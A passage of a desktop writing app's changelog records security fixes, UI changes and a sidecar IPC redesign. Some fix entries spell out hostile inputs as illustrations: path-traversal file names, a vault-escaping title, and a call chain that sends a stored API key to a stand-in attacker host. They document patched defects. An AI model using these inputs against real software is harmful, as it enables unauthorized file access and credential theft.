# Changelog

## Unreleased (production-readiness audit: security fix + four red suites cleared)

Deep audit of the desktop app for release blockers. One real Rust
security defect was found and fixed; the rest were test-harness and
brand-consistency drift. Gates: `cargo check --release --features
custom-protocol` exits 0, `npm run check` 0/0, `npm run build` clean,
and the full `test:source`, `test:themes`, `test:smoke`, `test:e2e`,
`test:reader`, `test:readersec`, `test:mobile`, `test:ghost`,
`test:writeback`, `test:audiostop`, and `test:aipanel` suites pass.

### Fixed
- **Security: backup restore/delete accepted a path escape from the
  renderer** (`doc_store/backups.rs`). `backup_restore` and `backup_delete`
  joined the caller's `backup_name` straight onto the backups dir, and
  `Path::join` trusts its argument: an absolute path replaces the base
  outright and `..` segments walk out of it. A compromised renderer could
  therefore read (`backup_restore("C:\...")` copies the target out and opens
  it as SQLite) or delete (`backup_delete("..\..\..\<file>")`) any file the
  process can reach. Both now route through `checked_backup_path`, which
  rejects anything that is not a single bare filename (no separators, no
  drive/colon prefix, no `..`/`.`, not empty), and `backup_delete` is scoped
  further to the `backup_` prefix `backup_create` writes, so a failed restore
  or a stray file in that folder can never be the thing that vanishes.
  Regression-guarded by `backup_names_may_not_escape_the_backup_dir`, which
  asserts nine hostile names plus a non-`backup_` in-directory name are all
  refused.
- **`test:resolve` (STT/TTS model resolution) was passing a stale port
  argument.** The servers read the model from `sys.argv[1]`; the harness
  was still passing the retired port as `argv[1]`, shifting the model name
  into `argv[2]`. The harness now passes only the model argument, so the
  traversal-rejection and fail-closed checks exercise the real resolution
  path again.
- **`test:reader` shelf assertions were racing the auto-open effect.**
  `ReaderWorkspace`'s `$effect` opens the active doc the moment the
  bookshelf resolves, so the shelf card is unobservable from outside. The
  test now settles the book view first, then reaches the shelf via the
  explicit Back button (`closeBook()`), and reopens the book to assert the
  reading controls.
- **`test:aipanel` and `test:audiostop` needed jsdom shims** for
  `Element.scrollTo` and `AudioContext.resume`, which jsdom does not
  implement. The suites now mirror the real WebView instead of throwing
  on the first scroll/stop call.

### Corrected
- **Release workflow is *not* broken — earlier audit report was a false
  positive.** It flagged `fetch_sidecars.py --typst` in
  `.github/workflows/release.yml` as "fetches only typst, release build will
  fail". `binaries/typst` is the only entry in `tauri.conf.json` →
  `bundle.externalBin`, i.e. the sole sidecar the build actually requires;
  STT/TTS/LLM are optional and degrade at runtime
  (`native_runtime_available`). `--typst` is a valid flag and fetches exactly
  what the build needs. No change made.

### Changed
- **PWA theme colors now match the shipped brand.**
  `public/manifest.webmanifest` still carried the pre-rebrand dark
  `#1B1A15` while `index.html` uses the light paper `#FAF9F6` (light is
  the default mode). Both `background_color` and `theme_color` are now
  `#FAF9F6`, and `test:mobile` asserts the value against `index.html`.

### Known-open (release blockers, need a maintainer decision — not code)
- **Updater key rotation will brick self-update for every existing install.**
  Verified from the published signature for
  `Just Write ehis_0.2.1_x64-setup.exe` (timestamp 2026-09-27 09:31 UTC):
  the shipped installer was signed with key `1C2875FB2CC4040E` (key from
  `cd0df63`, 09-26) — *not* the key at the `v0.2.1` tag, which is
  `1C2ACD78E48FDD60`. `tauri.conf.json` now carries `3FF086625EED8646`
  (from `3432429`, 09-30). The updater verifies each download against the
  pubkey compiled into the *running* binary, so every install in the field
  trusts `1C2875FB2CC4040E` and will reject a release signed with today's
  key. This is a release-process action, not a code change: the next release
  must be **signed with the superseded key `1C2875FB2CC4040E`** as a bridge
  (its binary already carries the new pubkey), and releases after that go
  back to normal. Requires the old private key — if it was deleted, the only
  remedy is a manual reinstall. Documented in `docs/UPDATES.md`
  ("Rotating the signing key").
- **Browser-global dialogs are used where the app otherwise has no dialog
  story.** `src/lib/importFile.ts:98` falls back to `window.prompt` for a
  locked-PDF password and `src/lib/widgetAutostart.ts:27` uses
  `window.confirm` for the autostart opt-in. No caller ever supplies
  `askPassword`, so `window.prompt` is the live path, and no
  `tauri-plugin-dialog` is installed (`tauri.conf.json:86`'s `"dialog":
  false` is the *updater* plugin's flag, unrelated). What these actually do
  in the shipped WebView2 runtime is **not verified** — WebView2 implements
  the Chromium dialogs, so the earlier audit's claim that they silently
  resolve to `undefined` is not established and should not be relied on.
  Worth checking on a real build and, if they misbehave, moving both to the
  dialog plugin or in-app UI like the rest of the error handling.
- **"Coming soon" stub is reachable in production UI.**
  `src/lib/components/WritingAnalytics.svelte:76` is rendered from
  `SettingsPane.svelte:1396`. Either ship the feature or hide the entry.

## Unreleased (UX polish: trust bugs + Capture discoverability + voice, plan filed)

Plan: `docs/PLANS/2026-10-09-ux-polish.md` (Phases 1–7; Phases 1–6 are
DONE). Gates for Phases 1–3: svelte-check 0/0, vite build clean,
onboard-flow + ws-toggles + shell-nav (desktop+mobile) + tabs-functional
+ e2e-browser + smoke + widget-invariants + acl-parity (174/174) +
settings-validate all pass. Phase 4 gates all green; the only failure
(test:themes) is a pre-existing esbuild "no loader for .woff/.woff2"
unrelated to these changes. Phase 5 keeps the same suite green. Phase 6
(all 12 items) gates all green.

### Changed
- **Inbox is now labeled Capture** (workspace id stays `inbox` — no data
  migration). Sidebar, palette ("Open Capture" / "Quick Capture
  (Capture)"), mobile More menu, Home labels, PropertiesView filter,
  HelpOverlay, Settings copy, notifications, and QuickCaptureOverlay all
  speak "Capture"; toasts read "Saved to Capture" / "Captured to
  Capture".
- **Capture is a default sidebar entry** — removed from
  `DEFAULT_HIDDEN_WORKSPACES` (Canvas is the only default-hidden
  workspace now). It keeps its untriaged-count badge in the Capture nav
  group alongside Logs. Onboarding default `hiddenIds` is `["canvas"]`.

### Fixed
- **Palette Quick Capture focuses the capture box** instead of creating
  an orphan "Untitled" doc in the inbox (was silently wrong; now matches
  the tray/status-bar behavior via `sendToCapture`).
- **Capture saves confirm with a toast** in both the Capture and Logs
  boxes ("Saved to Capture" / "Saved to Logs") — the box clears, so
  silence used to read as failure.
- **PWA-share text auto-saves** when the capture box was empty (with the
  same confirmation toast); a half-typed draft is never clobbered —
  shared text appends instead. Settings → Capture & Notifications and
  USER-GUIDE document this.
- **Capture empty state hints the shortcut** (Ctrl+Shift+F) instead of a
  bare "Inbox is empty".
- **Weekly triage banner is actionable** — an "Open Capture" button
  navigates straight to the workspace and dismisses the banner
  (`showBanner` gained an optional action; existing callers unchanged).
- **Settings → Capture & Notifications explains itself**: intro line
  covering Ctrl+Shift+F + status-bar/bottom-bar Capture entry, and
  descriptions for the Weekly Triage / Streak reminder toggles.
- **Just Write drives the real save indicator.** `queueDocSave` now calls
  `recordSave`/`saveSettled`/`saveFailed` (epoch-scoped, same contract as
  EditorPane), so the status bar follows the actual write and a failed
  save holds "error" instead of silently looking clean. The session-end
  recap reports words written THIS session (baseline at doc open), not
  the doc's lifetime total ("10,002 words in 1 min" was a lie).
- **Just Write no longer drops the last <500ms of typing** on workspace
  switch / window close: ported EditorPane's atomic-save flush +
  `pagehide` handler.
- **AI Cancel actually cancels.** `cancelGeneration` no longer nulls the
  AbortController before the token guard reads it (tokens kept appending
  after Cancel); a cancelled chat reply is dropped, never persisted to
  the conversation. Backend stream still drains (no per-request server
  abort) but nothing is appended or saved.
- **Composer/Structurize errors can no longer be inserted into the
  manuscript.** Write-back/append/copy actions hide on `Error:` output
  (same guard Chat already had); Structurize keeps Dismiss.
- **Error toasts latch until dismissed** (was: auto-vanished in 3s);
  the 3-toast cap evicts the oldest NON-error first so a data-loss error
  is never silently dropped by three success toasts.
- **Silent failures now surface:** Home dashboard load, daily-note
  open/create, auto-backup, and Reader position save all route through
  `domainError` (Reader toasts once per failure streak, not per scroll
  tick).
- **Voice dictation is honest and recoverable (Phase 3):** an empty
  transcription toasts "Nothing heard — try again, closer to the mic.";
  the mic button re-probes after a dead start (gated button is now a
  Retry) with humanized errors (permission denied / no mic / busy) and
  `role="alert"`; a starting in-flight guard prevents double-tap leaks;
  Esc mid-recording discards the take; mic/read-aloud state clears on
  the next attempt instead of lingering from last session.
- **Read-aloud pause/resume with position memory:** pause suspends the
  audio context (or browser speech) and resumes mid-section; stop keeps
  the current section so the next play restarts there, not at the top;
  Esc stops but keeps the section for resume.
- **Read-aloud follows along in the editor:** the active section is
  highlighted and scrolled into view (`.cm-tts-current`), matching the
  Reader's section flow; works in EditorPane and Just Write.
- **Settings → "Test TTS" actually plays a test voice** and leaves the
  Kokoro sidecar warm on success (was: silent probe that stopped the
  sidecar).
- **Idle model offload is announced** — "unloaded to save RAM" toasts
  when the STT/TTS/LLM sidecars are released (was: invisible).
- **Voice shortcuts:** Ctrl+Shift+M toggles dictation, Ctrl+Shift+A
  toggles read-aloud (Esc stops), Ctrl+Shift+↑/↓ adjusts speed
  (0.25–4×); documented in the shortcuts overlay's new Voice category.
- **Reading mode is no longer a trap (4.1):** Esc closes it (it used to
  swallow the key with no way out), and a floating "Exit reading mode"
  pill appears at the top-right so mouse-only users aren't stranded.
- **Themed markdown highlighting (4.2):** headings, bold, italic, links,
  quotes and lists now use the active palette (including glass light) in
  both EditorPane and Just Write, instead of default CodeMirror colors
  and literal `#` markers. Added `@codemirror/language` +
  `@lezer/highlight` as direct deps.
- **Typewriter scrolling is proportional and calm (4.3):** the live line
  stays in the middle third of the viewport instead of jumping to a fixed
  offset every keystroke, with scroll margins on both editors and
  `prefers-reduced-motion` respected.
- **EditorPane keeps its undo history (4.4):** theme, focus, typewriter
  and autocorrect changes now reconfigure via `Compartment` instead of
  rebuilding the editor, so Ctrl+Z survives every settings toggle.
- **One source of truth for keyboard shortcuts (4.5):** new
  `src/lib/shortcuts.ts` is imported by both the settings shortcuts panel
  and the `?` help overlay, which had drifted apart and advertised
  phantom bindings (Ctrl+S/N/O/H, Alt+1–9, Bold/Italic, and a
  "Focus Mode (F11)" tooltip that F11 never triggered). Ctrl+F find,
  Ctrl+Shift+F quick capture, Ctrl+Shift+S structurize and the voice keys
  are listed as they actually behave; bold/italic are called out as
  unreachable because the app-level Ctrl+B/Ctrl+I toggles win.
- **System theme mode (4.7):** Settings → Appearance gains a System
  option that follows the OS light/dark setting live; first paint
  resolves it before hydration. Glass modals no longer render dark-on-dark
  in light mode — frost is now theme-mode aware.
- **Zen mode is honest (4.8):** F11 now hides the status bar and the
  skill-nudge strip along with the sidebar, tab bar and breadcrumbs, so
  it really is editor-only.

### AI chat panel (Phase 5)
- **Chat follows the stream only when you're already at the bottom.**
  Auto-scroll used to yank you down mid-read; it now tracks a
  `stickToBottom` flag and shows a floating "jump to latest" button when
  you've scrolled up (5.1). Resumed conversations open at the top and
  stay there until you send something new.
- **The input autofocuses when the panel opens** (Ctrl+J lands you
  ready to type) (5.2).
- **Composer and Structurize can now be cancelled** — up to 180s
  generations with no stop button were a trap. Both track a running
  flag, abort mid-flight, and drop a cancelled result instead of
  committing it (5.3).
- **The panel shows which model will answer** ("Main model · <name>" /
  "Light model · <name>") in a chip above the input, so the wired-up slot
  is visible at a glance (5.4).
- **Regenerate button on the last reply** — re-run the same prompt without
  retyping; reuses the open conversation and swaps the stale assistant
  turn for a fresh one (5.5).
- **Structurize label no longer contradicts itself** — the badge said
  `{{...}}` while the parser takes `{...}` (5.6).
- **Escape unwinds one layer at a time** — replace-confirm, then
  history, then the panel itself (5.7); click-outside already closed
  the mobile overlay.
- **Jargon removed from the AI panel**: "small slot" → "light model",
  ":8093" dropped, "Blank mode — no context injected" → "document
  context off", and an in-flight LLM start no longer blanks the button
  label (5.8).
- **"Thinking…" flips to "Generating"** once the first token lands,
  instead of sitting on "Thinking…" for the whole stream (5.9).
- **Chat history renders instantly** — rows show the date fallback
  while first-message previews resolve, instead of a bare "Loading…"
  over 30 sequential IPC calls (5.10).
- **New `arrow-down` icon** for the scroll-to-bottom button.

### Reader, Home, StatusBar, auto-actions (Phase 6)
- **Reader gets a table of contents and live progress** (6.1): sections
  (already used for TTS) now power a Contents dropdown with click-to-jump
  and a live "% read" chip. Keyboard scrolling added (arrows, Page Up/Down,
  Home/End) with a focusable content area (6.2). The shelf filter empty
  state now tells the truth: "No books marked Reading" instead of the
  misleading "Your bookshelf is empty" (6.3).
- **Mark Finished gets confirm + undo** (6.4): the button now requires
  explicit confirmation, and a toast with "Undo" reverts the status back to
  reading. The `to-read`→`reading` flip on open is now wrapped in try/catch
  with a toast on failure.
- **Reader tabs re-read the document** (6.5): clicking a Reader tab now
  re-opens the book and restores the saved position instead of doing
  nothing.
- **ReaderProse seams removed** (6.6): fixed themes no longer render
  sections as separate cards with visible borders in sepia/dark modes.
- **HomePane gets a New Document CTA** (6.7): the empty state now shows a
  "New Document" button that creates and opens a doc in one click.
- **Home tasks get undo** (6.8): completing a task shows a toast with an
  "Undo" button instead of vanishing silently.
- **StatusBar becomes clickable** (6.9): word count, streak, and stats
  items open the stats panel; the workspace label switches to Write on
  click. Stats refresh debounced to 800ms to avoid hammering the API.
- **Skill Nudges tamed** (6.10): new `skillNudgesEnabled` setting in
  Settings → Tips toggles the strip globally; dismissing a nudge no longer
  auto-advances to the next; the message text is clickable and opens the
  relevant feature; the strip is hidden in Zen mode.
- **Plugin Manager relabeled as roadmap** (6.11): a notice banner now
  explains the panel is a preview of planned integrations; toggles and
  installs are not yet functional.
- **Smart suggestions get reasons, dismiss, and refresh** (6.12): each
  "Pick Up Where You Left Off" card now shows why it was suggested (e.g.,
  "Based on your activity in Novel Studio"), has a dismiss button, and the
  section has a refresh button to regenerate suggestions.

## Unreleased (sidecar slice 4: zero TCP ports + single-flight ensure)

Continuation of the user-approved sidecar lifecycle redesign (2026-10-09).
Verified: `cargo check` clean, `cargo test --lib` 132 passed (1 ignored),
svelte-check 0/0, all three prebuilt exes rebuilt (`build_sidecars.py`) and
smoke-tested over real pipes, no TCP listeners on 8090–8093.

### Changed
- **No sidecar binds a TCP port anymore.** STT/TTS/memory speak
  newline-delimited JSON over their own stdin/stdout pipes
  (`IpcSidecar`, `src-tauri/src/ipc.rs`): request `{"id","method","params"}`
  → response `{"id","ok",result|error}`; a reader thread routes responses
  to per-request oneshot channels by id, so concurrent calls are safe and
  a dead child fails every pending call instead of hanging it. The LLM
  (llama-server) binds an AF_UNIX `.sock` (`--host <path>.sock`); a
  hand-rolled HTTP/1.1 client (`SockClient`) speaks over that socket
  (non-streaming — covers /health, /completion, /v1/chat/completions,
  /v1/models; ws2_32 FFI for AF_UNIX on Windows, TcpStream-wrapped).
  Sentinel endpoint values (`http://127.0.0.1:8093/v1`,
  `http://localhost:8093/v1`) — the existing `smallModelEndpoint` default —
  now redirect server-side to the sock client in `ai_generate`,
  `ai_generate_stream` (single chunk; SSE-over-sock deferred),
  `ai_structurize`, and `provider_probe` (invoke signatures unchanged).
  Python server argv contract (app+exe ship together): stt `[model?]`,
  tts `[model_dir?]`, memory `[data_dir]`; env token contract unchanged
  (`JWE_SIDECAR_TOKEN`/`JWE_MEMORY_TOKEN` — pipe is private, but the
  contract keeps script/exe builds interchangeable). Deleted: port
  reclaim/port_owner/kill_port_owner/netstat/tasklist machinery,
  `stt_port`/`tts_port`/`llm_port` Tauri commands, and the frontend port
  wrappers (`api.ts` `sttPort`/`ttsPort`/`llmPort`, matching
  `browserBackend.ts` cases). Timeout constants (sidecar.rs): health 120s,
  media 180s, control 30s. `LlmManager` computes a fresh
  `jwe-llm-<uuid>.sock` under the temp dir, unlinked before spawn and on
  stop. One known non-regression: the onefile `stt-server.exe` smoke
  reports a missing transcribe engine (PyInstaller native-lib gap —
  pre-existing; frame round-trip works, script+venv Python loads the
  model fine).
- **`ensureSidecar` is single-flight and never kills a slow model**
  (slice E). Concurrent taps (mic hover + click, Ghost + Settings test)
  now share one in-flight ensure per sidecar kind instead of racing two
  starts; `fail()` no longer calls `spec.stop()` — a model that exceeded
  the 15s health poll keeps loading, and the next ensure reuses the live
  process via `isRunning()` + a fresh poll. The timeout message now says
  the sidecar "is still starting" rather than implying it was torn down.
- **Warm-on-intent** (slice B). Hovering the mic button for ~120ms
  pre-warms Moonshine STT (`warmStt`); hovering the read-aloud button
  pre-warms Kokoro TTS and does a silent first synthesis of `"."` so the
  ONNX voice model is already loaded before the first real utterance
  (`warmTts`, both in `audio.ts`). Wired via `onpointerenter`/`onpointerleave`
  with a 120ms dwell timer (cancelled on `onpointerleave` and `onDestroy`)
  in `MicButton.svelte` and `ReadAloudButton.svelte`; no-op in
  browser-preview mode. Turning Ghost on (with `llmEnabled`) fires
  `warmLlm()` via an `$effect` in `JustWriteWorkspace.svelte` — single-flight
  inside `ensureLlm` prevents a double start if `ghost.ts` already kicked
  one off. No boot pre-warm; cold boot stays silent.
- **Idle offload** (slice D). New `modelRetention` setting (`idle-5min`
  default / `session` = 30-min idle / `always` = never). `audio.ts` tracks
  last-used timestamps per sidecar (marked on ensure-success and on
  `transcribeAudio`/`synthesizeText`); a 30s interval watcher offloads
  STT/TTS/LLM past the idle threshold — skips STT while recording or
  transcribing, TTS while playing. `always` never offloads until the user
  stops the sidecar or the app exits. SettingsPane select under Local LLM.
- **"Browser voice" status badge** (slice F). In web preview (no Tauri
  sidecars), the StatusBar now shows a warning-colored "Browser voice"
  chip with a mic icon — voice features use the browser's Web Speech /
  speechSynthesis APIs instead of local models. The underlying browser
  dictation and read-aloud fallbacks in `MicButton`/`ReadAloudButton`
  already existed; this makes the   mode visible instead of tooltip-only.
- **No line-number gutter in writing views.** `EditorPane.svelte` and
  `MarkdownViewer.svelte` drop their explicit `lineNumbers()` (plus
  EditorPane's dead `basicSetup` import); `JustWriteWorkspace.svelte`
  keeps `basicSetup` for its keymaps/history/search and hides the strip
  via `.cm-gutters { display: none }` in the shared theme, covering main
  and split editors. Dead gutter CSS removed (EditorPane theme rules +
  reading/focus-mode selectors, MarkdownViewer border rule). Word count
  stays in the StatusBar.

### Fixed
- **`stop_reaps_child` flake under parallel test load.** `terminate_child`
  (`procutil.rs`) now treats "taskkill failed but child already exited" as
  success — Windows taskkill races (exit 255/128) when the process dies
  between spawn and taskkill's PID lookup. Previously this surfaced as a
  spurious `Err` in `ManagedSidecar::stop`.

### Added
- `IpcSidecar` + `SockClient` unit tests (`ipc.rs`): request-without-start
  errors, dechunk reassembly.

### Removed
- **PIN / app-lock subsystem (full scope, user-directed 2026-10-09).** The
  app-launch PIN gate and per-document locking are gone. Frontend: deleted
  `lock.ts` + `LockScreen.svelte`; dropped every lock branch from `App.svelte`,
  `WidgetApp.svelte`, `TabBar`, `SettingsPane`, `HomePane`, `InboxWorkspace`,
  `transclude`, `WikilinkPreview`, `SkillNudges`, `SkillsPage`, `AiPanel`,
  `EditorPane`, `JustWriteWorkspace`, `storyMemory`, `widgetBridge`,
  `settings.ts`, `settingsValidate.ts`, `api.ts`, `browserStore.ts`,
  `browserBackend.ts`. Backend: removed `app_lock_configured`/`_verify`/`_reset`,
  `verify_pin_value`, `doc_set_locked`, `widget_doc_unlocked`; `docs.locked`
  column dropped from the fresh schema (existing DBs keep the column harmlessly
  — no destructive migration) and from `Doc.locked`. Removed the locked-doc
  filters across `search.rs`, `rag.rs`, `snapshots.rs`, `bible.rs`,
  `doc_store.rs`. Orphaned generated ACL artifacts deleted
  (`permissions/autogenerated/app_lock_*.toml`, `doc_set_locked.toml`) and the
  stale grants stripped from `main.toml`/`widget.toml`. Orphaned keychain
  entry `appLockPin` remains in users' keychains until manually cleared.
  Verified: `cargo test --lib` 132 passed, `svelte-check` 0/0, e2e/memory
  stdio block green.

## Unreleased (sidecar slice 4, part G: spawn fix)

First slice of the user-approved sidecar lifecycle redesign (2026-10-09):
kill the "start every sidecar" dead end, kill console flashes. Verified
`cargo check` clean, `cargo test --lib` 134 passed (3 new), `svelte-check` 0/0.

### Fixed
- **Every dev-side sidecar start failed closed.** The frontend resolved the
  sidecars dir as `<resourceDir>/sidecars`, but in dev runs Tauri never
  copies sidecars there — the path didn't exist, so `require_sidecar_paths`
  refused ALL STT/TTS/memory/LLM starts while the same exes worked when
  spawned by hand. New single source of truth: Rust `sidecars_dir` command
  (`commands.rs`) tries packaged resource dir → beside the exe → source
  checkout (`CARGO_MANIFEST_DIR/sidecars`), each candidate trust-checked
  (`trusted_sidecars_dir`) and content-checked (`memory_server.py` or
  `bin/memory-server.exe`), and errors list every tried path.
  `getSidecarsDir()` (`audio.ts`) is now one invoke; browser preview keeps
  the dev-path string. Covered by 3 unit tests
  (`sidecars_dir_resolves_source_checkout_without_resource_dir`,
  `_missing_resource_candidate_falls_through`,
  `_reports_searched_paths_when_all_candidates_fail`).
- **Console windows flashed on every helper spawn.** No `CREATE_NO_WINDOW`
  anywhere in `src-tauri/src`: python probe, typst probe/compile, taskkill,
  and the sidecar servers themselves each popped a console. New
  `procutil::hide_console` (`creation_flags(0x08000000)`) applied at every
  surviving console spawn; GUI launches (explorer/open/xdg-open) untouched.
  netstat/tasklist port-reclaim sites left as-is — that whole path is
  deleted by the upcoming no-port transport swap.

## Unreleased (audit pass: UTF-8 panics, vault confinement, locked-doc leak)

Found by a four-lens repo audit; each critical claim re-verified against source
before fixing. Frontend changes are verified (`svelte-check` 0/0, `test:source` exit 0).
**The Rust changes in this section are not yet compiled or tested** â€” see Verification.

### Fixed
- **Panic on any non-ASCII title.** `sanitize_filename` guarded with `result.len() > 64`
  (bytes) then called `String::truncate(64)`, which panics when byte 64 lands inside a
  multi-byte character. 22 CJK chars is 66 bytes, so a Novel Studio / Projects / Script
  title in Chinese, an em-dash, or an emoji aborted the whole `doc_create` invoke.
  Tauri has no `catch_unwind`, so the panic unwound into a Tokio task and **the JS promise
  never settled** â€” no error toast, the dialog spinning forever. The failure mode was
  "working-looking but broken", not a visible crash.
- **Same panic in three AI-context snippets.** `get_workspace_context` sliced
  `&doc.1[..500]`, `&prev.1[..300.min(len)]` and `&content[..200.min(len)]`. The `.min(len)`
  form only *looks* safe: inside `if len > n` the `min` always collapses to `n`, so all
  three panicked identically. Now one `snippet_of` helper, and the drifted copies are
  gone. (This corrects an audit claim that two of the three were safe â€” they were not.)
- **Arbitrary file write outside the vault.** `create_doc` was the only write path in
  `doc_store.rs` that did not route through `resolve_in_vault` (save, delete, move,
  restore and atomic_save all did). Because `PathBuf::join` *replaces* the accumulated path
  when handed an absolute segment, and the `logs` branch split an unsanitised title on `-`
  to build directories, a title like `AAAAAAAAAA-C:\evil-x` relocated the write out of the
  vault entirely. `QuickCaptureOverlay.svelte` sets `title = body.slice(0, 80)` from typed
  text and offers `logs` as a target, so this was reachable from ordinary UI. `create_doc`
  now confines the path, and every `logs` segment goes through `sanitize_component`.
- **Daily-note date accepted unchecked.** `log_get_or_create` fed the renderer-supplied
  date straight into the title *and* the path. Now gated on a strict ASCII `YYYY-MM-DD`.
- **Locked-document leak via snapshots.** `snapshot_list` returned full snapshot bodies
  with no `docs.locked` filter, while twelve sibling read paths all filter â€” and
  `allow-snapshot-list` is granted to the companion window, so it silently defeated the
  widget ACL's own "locked docs stay out of the companion" guarantee. Now filtered.
  `snapshot_restore` is main-window-only and left alone deliberately: refusing it would
  block an owner restoring their own locked doc's history.
- **Boot sequence could reproduce the ghost window.** `App.svelte`'s boot IIFE had a
  `finally` that cleared the failsafe but no `catch`, so a synchronous throw would skip
  `ready = true` and `revealMainWindow()` *and* disarm the 20 s failsafe. Added a `catch`
  that shows the shell and a warning banner.
- **The boot gate skipped the companion window.** `WidgetApp` had no gate at all, so it
  still raced `setup`; its first `prepareWorkspace` could fail with
  `state not managed for field 'db'`, and because that error is rendered as
  `prepareError` with no retry, the widget displayed a raw Rust internal message. The
  widget now waits on the same gate. A comment in `App.svelte` had claimed the gate fixed
  the widget â€” it did not, and now says so accurately.
- **`app_boot_ready` missing from the browser preview.** `browserBackend.ts` had no case,
  so `api.appBootReady()` resolved `false` and the gate burned its entire 8 s budget on
  every preview load. Mirrored to `true` (no Rust `setup` to race in the preview).

### Removed
- `src/lib/components/SyncManager.svelte` â€” 275 lines, compiled into every bundle, never
  mounted, and absent from `BODY.md`. The exact "built but silently unwired" failure
  Body-anatomy exists to catch.

### Fixed (credential exfiltration + arbitrary read)
- **`provider_probe` was a renderer-directed exfiltration primitive.** The endpoint *and*
  the API key both came from the renderer, and the code explicitly declined private-IP
  gating. Since `secret_get("apiKey")` returns the stored key, a compromised webview could
  call `secret_get("apiKey")` then `provider_probe("https://attacker.tld", key)` and read
  the key straight back out of the response. The key is now attached **only** to a
  hardcoded `KEY_BEARING_HOSTS` list (the five providers the app ships with) or to a
  private IP literal / `localhost` â€” self-hosted and LAN providers keep working, and any
  other host is still probed, just unauthenticated, with the withholding logged rather
  than implied to have been verified. The allowlist is a Rust constant, **not** derived
  from settings: settings live in localStorage, so a compromised renderer could otherwise
  widen the list it is checked against. `localhost.attacker.tld` and
  `api.anthropic.com.attacker.tld` are rejected; `0177.0.0.1`-style leading-zero octets
  are rejected even though `parse()` accepts them.
- **`open_external_file` was an arbitrary read of any `.txt`/`.md` on the machine.** It
  took a renderer-supplied path with only extension, 25 MB and NUL-byte checks â€” no vault
  confinement, unlike every `fs_*` command. It now takes **no path at all**: the backend
  opens the file it recorded in `PendingLaunchFile` from argv / the OS file association.
  There was no legitimate caller that supplied a path (`nativeLaunch.ts` always fed it the
  backend's own pending file), so the parameter is gone rather than merely validated.

### Fixed (sidecar authentication)
- **STT, TTS and LLM loopback sidecars had no authentication at all.** Only the memory
  sidecar minted a per-launch token (`JWE_MEMORY_TOKEN` / `X-JWE-Memory-Token`); the other
  three accepted any caller. Loopback is not a trust boundary â€” any process running as any
  local Windows account can reach `127.0.0.1`, and any website in any browser can issue a
  **bodyless POST**, which is a CORS-simple request needing no preflight, to drive
  transcription or synthesis on this machine. All three now take a per-launch
  `JWE_SIDECAR_TOKEN` / `X-JWE-Sidecar-Token`, minted as a UUIDv4 per manager and sent on
  **every** request (5/5 STT, 3/3 TTS, 3/3 LLM request builders).
- **`stt_server.py` / `tts_server.py` now enforce the token** with `hmac.compare_digest` on
  both `do_GET` and `do_POST`, and **refuse to start at all** without it â€” so they cannot
  fall back to being an open endpoint if the launcher ever forgets to pass one.
- **`llama-server` now runs with `--api-key`.** Load-bearing: llama.cpp's HTTP server
  defaults to permissive CORS, so without it a site the user visited could POST prompts to
  the local model *and read the completions back cross-origin* â€” persistent free inference
  plus a cross-origin exfiltration sink. (`--host 127.0.0.1` limited reach to this machine;
  the key limits it to this app.)
- **`connect-src` no longer wildcards every loopback port.** `http://127.0.0.1:*` and
  `http://localhost:*` granted any JS in the webview reachability to *every other listener
  on the machine*. Replaced with the four sidecar ports named explicitly; every sidecar call
  is already proxied through Rust, so the webview needed no loopback access at all. The
  cloud AI providers and place-stamp hosts are untouched, and the **retired** Ollama
  endpoint (`localhost:11434`, `RETIRED_MAIN_ENDPOINT` in `settingsValidate.ts`) is
  deliberately *not* re-allowed.

### Changed
- **CodeMirror removed from the startup critical path: 1065 KB â†’ 349 KB (-67%),
  16 chunks â†’ 8.** `App.svelte` statically imported `EditorPane`, and because a
  static import's whole dependency closure must resolve before the importing
  module body runs, ~1 MB had to download and parse before `mount()` could start
  the BootLoader â€” so the progress UI could not paint during the largest part of
  boot. `EditorPane`, `Logs`, `JustWrite` and `Inbox` are now code-split through
  the existing `LazyWorkspace`.
  All four had to move **together**, which is the part worth recording: each
  reaches CodeMirror independently (`EditorPane` directly, `Logs` via its own
  `EditorPane` instance, `JustWrite` via `ghostWidget`, `Inbox` via `DocDetail`),
  so splitting any one of them left the chunk statically reachable and bought
  nothing. The first attempt did exactly that â€” it removed one import edge,
  moved the measured critical path by 0 KB, and would have added a "Loadingâ€¦"
  flash on the app's primary surface for no gain, so it was reverted.
  Measured by walking the static-import closure of the entry chunk in `dist/`.
  CodeMirror is now reachable only from lazy chunks (`EditorPane`, `AiPanel`,
  `ghost`, `editorFocus`), which load on first use. `test:smoke` shell-interactive
  time at 1280 px improved from ~572 ms to ~518 ms.

### Fixed (correctness + performance, round 2)
- **`fs_read_file` had no size cap** while `fs_write_file`, `attachment_save` and
  `open_external_file` all refused anything over 25 MB â€” so one path could force an arbitrarily
  large allocation inside the vault. The limit is now a named `MAX_TEXT_BYTES` constant shared
  by all four sites instead of a magic number repeated four times.
- **`docs.locked` was not filtered in three read paths** â€” `list_docs_by_workspace`,
  `log_list_entries` and `graph_query` (both its workspace-scoped and unfiltered branches)
  returned full `Doc` rows, content included, for locked documents. The app-lock guarantee was
  implemented per-query and these three were the gaps. A new test asserts the *unlocked* docs
  still appear, so the filter cannot be over-broad.
- **`browserBackend.ts` had drifted from Rust in ways a user can see.** Exporting the same
  manuscript from the preview and the desktop produced different files:
  - **`![[embed]]` inlining was missing entirely**, despite the function's own doc comment
    claiming it. `previewInlineEmbeds` now mirrors `convert.rs::inline_embeds`, including the
    `> [embed missing: â€¦]` marker.
  - **`slugify` dropped non-ASCII.** Rust uses the Unicode-aware `is_alphanumeric`, so
    `CafÃ©` â†’ `cafÃ©`; the mirror's `[^a-z0-9]+` gave `caf`. Now uses `\p{L}\p{N}`.
  - **`markdownToText` stripped one heading level**, where Rust's
    `trim_start_matches(['#','>',' ','\t'])` strips all of them â€” so `## Chapter` became
    `Chapter` on the desktop and `# Chapter` in the preview.
  - **Pass ordering.** Rust runs `inline_embeds` then `resolve_wikilinks` as two passes, so a
    `[[wikilink]]` inside an embedded note gets resolved; a single combined regex pass cannot,
    because a replacement is never rescanned. The preview now runs the same two passes, and its
    `resolveWikilinks` leaves `![[` markers alone exactly as Rust does ("inline_embeds handles
    it") instead of duplicating that logic.
  - **The PIN backoff constants did *not* diverge.** The audit reported them as a fourth
    divergence; they are identical (2000 / 60000 / 5). The parity test now asserts that rather
    than leaving it as folklore â€” verified, not assumed.

### Performance
- **`VACUUM INTO` no longer holds the app's only DB connection.** `backup_create` copied the
  whole database while holding the single connection's mutex, stalling every concurrent
  command (autosave, search, RAG) for the duration â€” and it ran on the boot path. It now runs on
  a second connection (WAL permits a reader alongside the writer) when the backing file is known,
